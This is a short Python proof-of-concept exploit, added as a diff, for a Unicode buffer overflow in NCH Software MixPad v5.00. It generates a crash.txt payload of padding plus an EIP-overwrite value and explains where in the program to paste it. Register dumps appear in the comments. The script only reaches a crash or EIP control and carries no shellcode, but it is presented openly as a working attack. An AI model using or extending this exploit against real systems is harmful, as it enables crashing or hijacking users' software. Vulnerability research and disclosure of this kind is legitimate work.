@@ -1,0 +1,39 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: NCH Software MixPad v5.00 - Unicode Buffer Overflow
+# Date: 21-01-2017
+# Vulnerable Software: NCH Software MixPad
+# Vendor Homepage: http://www.nch.com.au/mixpad
+# Version: v5.00
+# Software Link: http://www.nch.com.au/mixpad/mpsetup.exe
+# Tested On: Windows XP
+#
+#
+# PoC: generate crash.txt, options, metronome tab, paste crash.txt in 'choose a custom metronome sound' 
+#
+# no unicode jmp/call to esp
+# 
+# EAX 00117700
+# ECX 001167F0
+# EDX 7C90E514 ntdll.KiFastSystemCallRet
+# EBX 00000000
+# ESP 00116C40 UNICODE "BBBBBB does not exist or cannot be accessed."
+# EBP 00116FAC
+# ESI 0000004E
+# EDI 00117740
+# EIP 00CC00CC
+
+filename="crash.txt"
+ 
+junk = "A"*251
+eip = "\xcc"*2  			#eip over; jmp/call esp goes here
+fill = "B"*100				#only 6 used in esp
+buffer = junk + eip + fill
+
+  
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
